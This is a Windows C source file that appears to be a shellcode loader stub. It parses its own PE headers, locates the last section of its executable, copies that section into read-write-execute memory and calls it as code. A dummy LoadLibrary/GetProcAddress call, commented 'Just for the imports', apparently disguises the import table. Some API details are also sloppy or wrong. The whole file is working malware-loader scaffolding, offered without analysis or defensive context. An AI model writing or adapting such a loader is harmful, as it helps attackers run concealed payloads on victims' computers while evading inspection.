#include <windows.h>

int main(int argc, char const *argv[])
{

    // Just for the imports
    HMODULE k32 = LoadLibrary("USER32.dll");
    GetProcAddress(k32, "VirtualAlloc");

    // Get module handle
    LPVOID moduleHandle = GetModuleHandle(NULL);
    if (moduleHandle == NULL)
        return 1;

    PIMAGE_DOS_HEADER dosHeader = {};
    PIMAGE_SECTION_HEADER sectionHeader = {};
    dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;

#if defined(__MINGW64__) || defined(_WIN64)
    PIMAGE_NT_HEADERS64 imageNTHeaders = {};
    imageNTHeaders = (PIMAGE_NT_HEADERS64)(moduleHandle + dosHeader->e_lfanew);
    __int64 sectionLocation = (__int64)((__int64)(&imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader);
    FlushInstructionCache(moduleHandle, NULL, NULL);
#else
    PIMAGE_NT_HEADERS imageNTHeaders = {};
    imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)moduleHandle + dosHeader->e_lfanew);
    DWORD sectionLocation = (DWORD) & (imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader;
#endif

    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER);
    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        sectionLocation += sectionSize;
    }
    // Execute last section data
    unsigned char *buffer = (unsigned char *)VirtualAlloc(NULL, sectionHeader->SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy((void *)buffer, (void *)(sectionHeader->VirtualAddress + imageNTHeaders->OptionalHeader.ImageBase), sectionHeader->SizeOfRawData);
    (*(void (*)())buffer)();

    return 0;
}
